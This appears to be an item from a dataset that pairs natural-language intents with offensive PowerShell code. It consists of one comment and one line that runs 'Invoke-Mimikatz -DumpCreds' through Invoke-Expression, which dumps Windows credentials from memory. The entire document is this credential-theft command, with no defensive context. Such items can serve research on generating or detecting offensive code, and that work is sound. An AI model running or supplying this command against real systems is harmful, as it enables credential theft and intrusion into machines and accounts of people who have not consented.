# Natural language intent:
# Defines and invokes the Mimikatz command using Invoke-Expression.

$command = "Invoke-Mimikatz -DumpCreds"; Invoke-Expression -Command $command;
